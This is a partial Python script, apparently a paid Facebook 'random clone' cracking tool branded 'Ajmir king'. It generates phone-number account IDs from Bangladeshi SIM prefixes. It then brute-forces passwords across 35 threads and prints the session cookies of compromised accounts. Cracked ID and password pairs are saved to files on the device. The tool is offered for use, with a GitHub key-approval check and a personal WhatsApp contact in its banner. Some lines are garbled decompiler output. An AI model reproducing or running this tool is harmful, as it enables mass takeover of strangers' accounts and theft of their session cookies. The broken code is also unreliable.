...
def saiya():
    ...
    if opt == '1':
        menu()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/Ajmir.Hossain.008&mibextid=ZbWKwL')
        return None
    if None == '0':
        os.system('exit')
        return None
...
\033[1;32m║	         \033[1;91m ─━<🌺Ajmir king🌺>━─\033[1;32m	           ║
\033[1;32m║	         \033[1;91m \033[1;32m	                                   ║
...
\033[1;91m╚══════════════════════════════════════════════════════════╝                                                                                                                                     
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃\033[1;93m [✓] AUTHOR    \033[1;91m: \033[1;93mAjmir king               ┃\033[32;1mAjmir king
 ┃\033[1;35m [✓] TOOL      \033[1;91m: \033[1;35mRANDOM CLONE               ┃\033[33;1mAjmir king
 ┃\033[1;91m [✓] STATUS    \033[1;91m: \033[1;91mpaid                      ┃\033[34;1mAjmir king
 ┃\033[30;1m [✓] SYSTEM    \033[1;91m: \033[30;1mDATA & WIFI                ┃\033[35;1mAjmir king
 ┃\33[1;92m [✓] GITHUB    \033[1;91m: \33[1;92mAJMIR-HOSSAIN-404             ┃\033[36;1mAjmir king
 ┃\033[1;34m [✓] FACEBOOK  \033[1;91m: \033[1;34mAjmir Hossain                ┃\033[37;1mAjmir king
 ┃\033[1;36m [✓] WHATSAPP  \033[1;91m: \033[1;36m+8801813225678             ┃\033[33;1mAjmir king
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
loop = 0
oks = []
cps = []
...
def ak():
    ...
    code = input('\033[1;37m[Ajmir king] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[Ajmir king] CRACK ID LIMIT : '))
    ...
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[Ajmir king] SIM CODE  : '+code)
        print('\033[1;37m[Ajmir king] CRACK ID  : '+tl)
        slower('\033[1;37m[Ajmir king] CRACKING......')
        linex()
        for love in user:
            uid = code+love
...
def ak1():
    os.system("clear")
    print(logo)
    print('\033[1;37m[Ajmir king] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[Ajmir king] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
...
def ak5():
    ...
    with ThreadPool(max_workers=35) as setu:
        ...
        print('\033[1;37m[Ajmir king] SIM CODE  : '+code)
        print('\033[1;37m[Ajmir king] CRACK ID  : '+tl)
        slower('\033[1;37m[Ajmir kingp] CRACKING......')
        linex()
        for love in user:
            uid = code+love
            bl=uid[:6]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[Ajmir king-OK] '+uid+ ' | ' +ps+ '\n\033[1;37m[\033[38;5;46mCOOKIE\033[38;5;196mâ€¢\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/Ajmir king-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[Ajmir king-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/Ajmir king-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def approval():
	...
	key = "6".join(uuid)
	a=requests.get("https://github.com/AJMIR-HOSSAIN-404/PAID-TOOLS/blob/main/Approval.txt").text
	if key in a:
		approval()
	else:
